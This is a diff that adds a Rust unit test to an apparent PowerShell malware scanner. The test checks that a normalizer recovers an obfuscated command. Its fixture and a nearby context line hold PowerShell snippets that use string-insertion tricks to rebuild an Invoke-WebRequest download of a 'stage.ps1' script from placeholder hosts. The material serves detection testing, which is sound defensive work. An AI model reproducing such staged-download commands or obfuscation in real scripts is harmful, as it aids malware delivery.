@@ -15972,6 +15972,22 @@ Cut 'Invoke-JUNKWebRequest -Uri https://ps-remove-extractor.example/stage.ps1' 7
     }
 
     #[test]
+    fn ps1_normalization_decodes_literal_insert_extractor_call() {
+        let decoded = "Invoke-WebRequest -Uri https://ps-insert-extractor.example/stage.ps1";
+        let ps = r#"function Add($value,$start,$text) {
+  return $value.Insert($start,$text)
+}
+Add 'InvokeWebRequest -Uri https://ps-insert-extractor.example/stage.ps1' 6 '-'"#;
+        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
+
+        assert!(
+            normalized.contains(&format!("'{decoded}'")),
+            "literal insert extractor call was not normalized:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
     fn ps1_literal_new_item_function_path_name_extractor_call_recovers_nested_command() {
         use base64::Engine;
 
